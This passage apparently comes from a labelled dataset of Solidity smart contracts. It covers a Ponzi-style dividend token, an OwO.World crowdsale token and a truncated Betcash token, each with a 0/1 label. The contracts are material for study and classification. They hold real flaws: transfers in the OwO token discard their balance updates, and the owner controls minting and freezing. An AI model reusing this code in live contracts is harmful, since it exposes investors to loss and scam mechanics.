{\r\r\n\t\t\/\/ Don&#39;t allow for funding if the amount of Ether sent is less than 1 szabo.\r\r\n\t\tif (msg.value > 0.000001 ether) {\r\r\n\t\t    contractBalance = add(contractBalance, msg.value);\r\r\n\t\t\tbuy();\r\r\n\t\t} else {\r\r\n\t\t\trevert();\r\r\n\t\t}\r\r\n    }\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of buying a finney worth of tokens.\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of selling a single token.\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n        var eth = getEtherForTokens(1 finney);\r\r\n        var fee = div(eth, 10);\r\r\n        return eth - fee;\r\r\n    }\r\r\n\r\r\n\t\/\/ Calculate the current dividends associated with the caller address. This is the net result\r\r\n\t\/\/ of multiplying the number of tokens held by their current value in Ether and subtracting the\r\r\n\t\/\/ Ether that has already been paid out.\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\t\treturn (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) \/ scaleFactor;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Version of withdraw that extracts the dividends and sends the Ether to the caller.\r\r\n\t\/\/ This is only used in the case when there is no transaction data, and that should be\r\r\n\t\/\/ quite rare unless interacting directly with the smart contract.\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\t\tto.transfer(balance);\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Internal balance function, used to calculate the dynamic reserve value.\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\treturn contractBalance - msg.value;\r\r\n\t}\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\t\t\/\/ Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(msg.value, 10);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you&#39;re gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\t\t\t\r\r\n\t\t}\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We&#39;re a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee\r\r\n\t\/\/ to discouraging dumping, and means that if someone near the top sells, the fee distributed\r\r\n\t\/\/ will be *significant*.\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\t    \/\/ Calculate the amount of Ether that the holders tokens sell for at the current sell price.\r\r\n\t\tvar numEthersBeforeFee = getEtherForTokens(amount);\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the resulting Ether is used to pay remaining holders.\r\r\n        var fee = div(numEthersBeforeFee, 10);\r\r\n\t\t\r\r\n\t\t\/\/ Net Ether for the seller after the fee has been subtracted.\r\r\n        var numEthers = numEthersBeforeFee - fee;\r\r\n\t\t\r\r\n\t\t\/\/ *Remove* the numTokens which were just sold from the total supply. We&#39;re \/definitely\/ a crypto central bank.\r\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\r\n\t\t\r\r\n        \/\/ Remove the tokens from the balance of the buyer.\r\r\n\t\ttokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);\r\r\n\r\r\n        \/\/ Update the payout array so that the seller cannot claim future dividends unless they buy back in.\r\r\n\t\t\/\/ First we compute how much was just paid out to the seller...\r\r\n\t\tvar payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));\r\r\n\t\t\r\r\n        \/\/ We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,\r\r\n\t\t\/\/ since they&#39;re selling all of their tokens). This makes sure the seller isn&#39;t disadvantaged if\r\r\n\t\t\/\/ they decide to buy back in.\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\t\t\r\r\n\t\t\r\r\n\t\t\/\/ Decrease the total amount that&#39;s been paid out to maintain invariance.\r\r\n        totalPayouts -= payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this is a bit of an irrelevant check since we&#39;re\r\r\n\t\t\/\/ selling tokens, but it guards against division by zero).\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Scale the Ether taken as the selling fee by the scaleFactor variable.\r\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ Fee is distributed to all remaining token holders.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this sell.\r\r\n\t\t\tvar rewardPerShare = etherFee \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken = add(earningsPerToken, rewardPerShare);\r\r\n\t\t}\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ Dynamic value of Ether in reserve, according to the CRR requirement.\r\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\r\n\t\treturn sub(balance(),\r\r\n\t\t\t ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) \/ scaleFactor));\r\r\n\t}\r\r\n\r\r\n\t\/\/ Calculates the number of tokens that can be bought for a given amount of Ether, according to the\r\r\n\t\/\/ dynamic reserve and totalSupply values (derived from the buy and sell prices).\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.\r\r\n\tfunction calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts a number tokens into an Ether value.\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\t\t\/\/ How much reserve Ether do we have left in the contract?\r\r\n\t\tvar reserveAmount = reserve();\r\r\n\r\r\n\t\t\/\/ If you&#39;re the Highlander (or bagholder), you get The Prize. Everything left in the vault.\r\r\n\t\tif (tokens == totalSupply)\r\r\n\t\t\treturn reserveAmount;\r\r\n\r\r\n\t\t\/\/ If there would be excess Ether left after the transaction this is called within, return the Ether\r\r\n\t\t\/\/ corresponding to the equation in Dr Jochen Hoenicke&#39;s original Ponzi paper, which can be found\r\r\n\t\t\/\/ at https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/ in the third equation, with the CRR numerator \r\r\n\t\t\/\/ and denominator altered to 1 and 2 respectively.\r\r\n\t\treturn sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d\/crr_n));\r\r\n\t}\r\r\n\r\r\n\t\/\/ You don&#39;t care about these, but if you really do they&#39;re hex values for \r\r\n\t\/\/ co-efficients used to simulate approximations of the log and exp functions.\r\r\n\tint256  constant one        = 0x10000000000000000;\r\r\n\tuint256 constant sqrt2      = 0x16a09e667f3bcc908;\r\r\n\tuint256 constant sqrtdot5   = 0x0b504f333f9de6484;\r\r\n\tint256  constant ln2        = 0x0b17217f7d1cf79ac;\r\r\n\tint256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;\r\r\n\tint256  constant c1         = 0x1ffffffffff9dac9b;\r\r\n\tint256  constant c3         = 0x0aaaaaaac16877908;\r\r\n\tint256  constant c5         = 0x0666664e5e9fa0c99;\r\r\n\tint256  constant c7         = 0x049254026a7630acf;\r\r\n\tint256  constant c9         = 0x038bd75ed37753d68;\r\r\n\tint256  constant c11        = 0x03284a0c14610924f;\r\r\n\r\r\n\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\t\tint32 scale = 0;\r\r\n\t\twhile (a > sqrt2) {\r\r\n\t\t\ta \/= 2;\r\r\n\t\t\tscale++;\r\r\n\t\t}\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\t\t\ta *= 2;\r\r\n\t\t\tscale--;\r\r\n\t\t}\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\t\treturn scale * ln2 +\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\t}\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\t\r\r\n\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\t\ta -= scale*ln2;\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\t\tif (scale >= 0)\r\r\n\t\t\texp <<= scale;\r\r\n\t\telse\r\r\n\t\t\texp >>= -scale;\r\r\n\t\treturn exp;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ The below are safemath implementations of the four arithmetic operators\r\r\n\t\/\/ designed to explicitly prevent over- and under-flows of integer values.\r\r\n\r\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tif (a == 0) {\r\r\n\t\t\treturn 0;\r\r\n\t\t}\r\r\n\t\tuint256 c = a * b;\r\r\n\t\tassert(c \/ a == b);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\t\/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n\t\tuint256 c = a \/ b;\r\r\n\t\t\/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tassert(b <= a);\r\r\n\t\treturn a - b;\r\r\n\t}\r\r\n\r\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tuint256 c = a + b;\r\r\n\t\tassert(c >= a);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\t\/\/ This allows you to buy tokens by sending Ether directly to the smart contract\r\r\n\t\/\/ without including any transaction data (useful for, say, mobile wallet apps).\r\r\n\tfunction () payable public {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\tif (msg.value > 0) {\r\r\n\t\t\tfund();\r\r\n\t\t} else {\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\t\t}\r\r\n\t}\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract OwOWorldToken {\r\r\n\r\r\n    using SafeMath for uint256;\r\r\n\r\r\n    string public constant symbol = \"OWO\";\r\r\n    string public constant name = \"OwO.World Token\";\r\r\n    uint public constant decimals = 18;\r\r\n\r\r\n    uint public _owoAmount;\r\r\n    uint public _totalSupply = 0;\r\r\n\r\r\n    uint public _oneTokenInWei = 108931000000000; \/\/ starts at $0.02\r\r\n    bool public _CROWDSALE_PAUSED = false;\r\r\n\r\r\n    address public _ownerWallet;   \/\/ owner wallet\r\r\n    address public _multiSigWallet;  \/\/ The address to hold the funds donated\r\r\n    uint public _totalEthCollected = 0;            \/\/ In wei\r\r\n    bool public _saleFinalized = false;         \/\/ Has OwO Dev finalized the sale?\r\r\n\r\r\n    uint constant public dust = 1 finney;    \/\/ Minimum investment\r\r\n    uint public _cap = 50000 ether;       \/\/ Hard cap to protect the ETH network from a really high raise\r\r\n    uint public _capOwO = 100000000 * 10 ** decimals;   \/\/ total supply of owo for the crowdsale\r\r\n\r\r\n    uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 25;\r\r\n\r\r\n    \/* How many distinct addresses have invested *\/\r\r\n    uint public _investorCount = 0;\r\r\n\r\r\n    \/* the UNIX timestamp end date of the crowdsale *\/\r\r\n    uint public _endsAt;\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n    \/\/ Crowdsale end time has been changed\r\r\n    event EndsAtChanged(uint endsAt);\r\r\n\r\r\n    mapping(address => uint256) balances;\r\r\n    mapping(address => mapping(address => uint256)) allowed;\r\r\n    mapping (address => uint256) public investedAmountOf;\r\r\n    mapping (address => uint256) public tokenAmountOf;\r\r\n\r\r\n\r\r\n    function () payable{\r\r\n        createTokens();\r\r\n    }\r\r\n\r\r\n    function OwOWorldToken()\r\r\n    {\r\r\n\r\r\n        _ownerWallet = msg.sender;\r\r\n\r\r\n        uint tokenAmount = 500000 * 10 ** decimals;\r\r\n        balances[_ownerWallet] = balances[_ownerWallet].add(tokenAmount);\r\r\n        _totalSupply = _totalSupply.add(tokenAmount);\r\r\n        _multiSigWallet = 0x6c5140f605a9Add003B3626Aae4f08F41E6c6FfF;\r\r\n        _endsAt = 1514332800;\r\r\n\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner(){\r\r\n        require(msg.sender == _ownerWallet);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function setOneTokenInWei(uint w) onlyOwner {\r\r\n        _oneTokenInWei = w;\r\r\n        changed(msg.sender);\r\r\n    }\r\r\n\r\r\n    function setMultiSigWallet(address w) onlyOwner {\r\r\n        require(w != 0\r\r\n          && _investorCount < MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE\r\r\n          );\r\r\n\r\r\n          _multiSigWallet = w;\r\r\n\r\r\n        changed(msg.sender);\r\r\n    }\r\r\n\r\r\n    function setEndsAt(uint time) onlyOwner {\r\r\n\r\r\n      require(now < time);\r\r\n\r\r\n      _endsAt = time;\r\r\n      EndsAtChanged(_endsAt);\r\r\n    }\r\r\n\r\r\n    function setPause(bool w) onlyOwner{\r\r\n        _CROWDSALE_PAUSED = w;\r\r\n        changed(msg.sender);\r\r\n    }\r\r\n\r\r\n   function setFinalized(bool w) onlyOwner{\r\r\n        _saleFinalized = w;\r\r\n        changed(msg.sender);\r\r\n        if(_saleFinalized == true){\r\r\n            withdraw();\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function getMultiSigWallet() constant returns (address){\r\r\n\r\r\n        return _multiSigWallet;\r\r\n\r\r\n    }\r\r\n    function getMultiSigBalance() constant returns (uint){\r\r\n\r\r\n        return balances[_multiSigWallet];\r\r\n\r\r\n    }\r\r\n    function getTotalSupply() constant returns (uint){\r\r\n\r\r\n        return _totalSupply;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n    function getTotalEth() constant returns (uint){\r\r\n\r\r\n        return _totalEthCollected;\r\r\n\r\r\n    }\r\r\n\r\r\n    function getTotalPlayers() constant returns (uint){\r\r\n\r\r\n        return _investorCount;\r\r\n\r\r\n    }\r\r\n    function createTokens() payable{\r\r\n\r\r\n        require(\r\r\n            msg.value > 0\r\r\n            && _totalSupply < _capOwO\r\r\n            && _CROWDSALE_PAUSED ==false\r\r\n            && _saleFinalized == false\r\r\n            && now < _endsAt\r\r\n            );\r\r\n\r\r\n               \/\/priced at $0.03\r\r\n            if(_totalSupply >500001 && _totalSupply<1000000 && _oneTokenInWei<135714800000000){\r\r\n                _oneTokenInWei = 135714800000000;\r\r\n            }\r\r\n            \/\/priced at $0.04\r\r\n            if(_totalSupply >1000001 && _totalSupply<2000000 && _oneTokenInWei<180953100000000){\r\r\n                _oneTokenInWei = 180953100000000;\r\r\n            }\r\r\n            \/\/priced at $0.05\r\r\n            if(_totalSupply>2000001 && _totalSupply<4000000 && _oneTokenInWei<226191400000000){\r\r\n                _oneTokenInWei = 226191400000000;\r\r\n            }\r\r\n            \/\/priced at $0.06\r\r\n            if(_totalSupply>4000001 && _totalSupply<6000000 && _oneTokenInWei<271429700000000){\r\r\n              _oneTokenInWei = 271429700000000;\r\r\n            }\r\r\n            \/\/priced at $0.07\r\r\n            if(_totalSupply>6000001 && _totalSupply<8000000 && _oneTokenInWei<316667900000000){\r\r\n              _oneTokenInWei = 316667900000000;\r\r\n            }\r\r\n            \/\/priced at $0.08\r\r\n            if(_totalSupply>8000001 && _totalSupply<10000001 && _oneTokenInWei<361906200000000){\r\r\n              _oneTokenInWei = 361906200000000;\r\r\n            }\r\r\n\r\r\n\r\r\n            if(investedAmountOf[msg.sender] == 0) {\r\r\n                   \/\/ A new investor\r\r\n                   _investorCount = _investorCount.add(1);\r\r\n            }\r\r\n\r\r\n            _owoAmount = msg.value.div(_oneTokenInWei);\r\r\n\r\r\n            balances[msg.sender] = balances[msg.sender].add(_owoAmount);\r\r\n            _totalSupply = _totalSupply.add(_owoAmount);\r\r\n            _totalEthCollected = _totalEthCollected.add(msg.value);\r\r\n            investedAmountOf[msg.sender] = investedAmountOf[msg.sender].add(msg.value);\r\r\n\r\r\n            transfer(_ownerWallet,msg.value);\r\r\n\r\r\n\r\r\n\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns(uint256 balance){\r\r\n\r\r\n        return balances[_owner];\r\r\n\r\r\n    }\r\r\n\r\r\n    event changed(address a);\r\r\n\r\r\n    function transfer(address _to, uint256 _value) returns(bool success){\r\r\n        require(\r\r\n            balances[msg.sender] >= _value\r\r\n            && _value > 0\r\r\n            );\r\r\n            balances[msg.sender].sub(_value);\r\r\n            balances[_to].add(_value);\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) onlyOwner returns (bool success){\r\r\n        require(\r\r\n            allowed[_from][msg.sender] >= _value\r\r\n            && balances[_from] >= _value\r\r\n            && _value >0\r\r\n\r\r\n            );\r\r\n\r\r\n            balances[_from].sub(_value);\r\r\n            balances[_to].add(_value);\r\r\n            allowed[_from][msg.sender].sub(_value);\r\r\n            Transfer(_from,_to,_value);\r\r\n            return true;\r\r\n    }\r\r\n\r\r\n    function getBlockNumber() constant internal returns (uint) {\r\r\n        return block.number;\r\r\n    }\r\r\n\r\r\n    function withdraw() onlyOwner payable{\r\r\n\r\r\n         assert(_multiSigWallet.send(this.balance));\r\r\n\r\r\n     }\r\r\n\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.2;\r\r\ncontract owned {\r\r\n    address public owner;\r\r\n\r\r\n    function owned() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        if (msg.sender != owner) revert();\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner {\r\r\n        owner = newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData); }\r\r\n\r\r\ncontract token {\r\r\n    \/* Public variables of the token *\/\r\r\n    string public name;\r\r\n    string public symbol;\r\r\n    uint8 public decimals;\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    \/* This creates an array with all balances *\/\r\r\n    mapping (address => uint256) public balanceOf;\r\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\r\n\r\r\n    \/* This generates a public event on the blockchain that will notify clients *\/\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n\r\r\n    \/* Initializes contract with initial supply tokens to the creator of the contract *\/\r\r\n    function token(\r\r\n        uint256 initialSupply,\r\r\n        string tokenName,\r\r\n        uint8 decimalUnits,\r\r\n        string tokenSymbol\r\r\n        ) {\r\r\n        balanceOf[msg.sender] = initialSupply;              \/\/ Give the creator all initial tokens\r\r\n        totalSupply = initialSupply;                        \/\/ Update total supply\r\r\n        name = tokenName;                                   \/\/ Set the name for display purposes\r\r\n        symbol = tokenSymbol;                               \/\/ Set the symbol for display purposes\r\r\n        decimals = decimalUnits;                            \/\/ Amount of decimals for display purposes\r\r\n    }\r\r\n\r\r\n    \/* Send coins *\/\r\r\n    function transfer(address _to, uint256 _value) {\r\r\n        if (balanceOf[msg.sender] < _value) revert();           \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) revert(); \/\/ Check for overflows\r\r\n        balanceOf[msg.sender] -= _value;                     \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;                            \/\/ Add the same to the recipient\r\r\n        Transfer(msg.sender, _to, _value);                   \/\/ Notify anyone listening that this transfer took place\r\r\n    }\r\r\n\r\r\n    \/* Allow another contract to spend some tokens in your behalf *\/\r\r\n    function approve(address _spender, uint256 _value)\r\r\n        returns (bool success) {\r\r\n        allowance[msg.sender][_spender] = _value;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/* Approve and then communicate the approved contract in a single tx *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\r\r\n        returns (bool success) {    \r\r\n        tokenRecipient spender = tokenRecipient(_spender);\r\r\n        if (approve(_spender, _value)) {\r\r\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\r\r\n            return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/* A contract attempts to get the coins *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        if (balanceOf[_from] < _value) revert();                 \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) revert();  \/\/ Check for overflows\r\r\n        if (_value > allowance[_from][msg.sender]) revert();   \/\/ Check allowance\r\r\n        balanceOf[_from] -= _value;                          \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;                            \/\/ Add the same to the recipient\r\r\n        allowance[_from][msg.sender] -= _value;\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/* This unnamed function is called whenever someone tries to send ether to it *\/\r\r\n    function () {\r\r\n        revert();     \/\/ Prevents accidental sending of ether\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Betcash is owned, token {\r\r\n\r\r\n    uint public buyRate = 4000; \/\/ price of one token\r\r\n    bool public isSelling = true;\r\r\n\r\r\n    mapping (address => bool) public frozenAccount;\r\r\n\r\r\n    \/* This generates a public event on the blockchain that will notify clients *\/\r\r\n    event FrozenFunds(address target, bool frozen);\r\r\n\r\r\n    \/* Initializes contract with initial supply tokens to the creator of the contract *\/\r\r\n    function Betcash(\r\r\n        uint256 initialSupply,\r\r\n        string tokenName,\r\r\n        uint8 decimalUnits,\r\r\n        string tokenSymbol\r\r\n    ) token (initialSupply, tokenName, decimalUnits, tokenSymbol) {}\r\r\n\r\r\n    \/* Send coins *\/\r\r\n    function transfer(address _to, uint256 _value) {\r\r\n        if (balanceOf[msg.sender] < _value) revert();           \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) revert(); \/\/ Check for overflows\r\r\n        if (frozenAccount[msg.sender]) revert();                \/\/ Check if frozen\r\r\n        balanceOf[msg.sender] -= _value;                     \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;                            \/\/ Add the same to the recipient\r\r\n        Transfer(msg.sender, _to, _value);                   \/\/ Notify anyone listening that this transfer took place\r\r\n    }\r\r\n\r\r\n    \/* A contract attempts to get the coins *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        if (frozenAccount[_from]) revert();                        \/\/ Check if frozen            \r\r\n        if (balanceOf[_from] < _value) revert();                 \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) revert();  \/\/ Check for overflows\r\r\n        if (_value > allowance[_from][msg.sender]) revert();   \/\/ Check allowance\r\r\n        balanceOf[_from] -= _value;                          \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;                            \/\/ Add the same to the recipient\r\r\n        allowance[_from][msg.sender] -= _value;\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function mintToken(address target, uint256 mintedAmount) onlyOwner {\r\r\n        balanceOf[target] += mintedAmount;\r\r\n        Transfer(0, owner, mintedAmount);\r\r\n        Transfer(owner, target, mintedAmount);\r\r\n    }\r\r\n\r\r\n    function freezeAccount(address target, bool freeze) onlyOwner {\r\r\n        frozenAccount[target] = freeze;\r\r\n        FrozenFunds(target, freeze);\r\r\n    }\r\r\n\r\r\n    function setBuyRate(uint newBuyRate) onlyOwner {\r\r\n        buyRate = newBuyRate;\r\r\n    }\r\r\n    \r\r\n    function setSelling(bool newStatus) 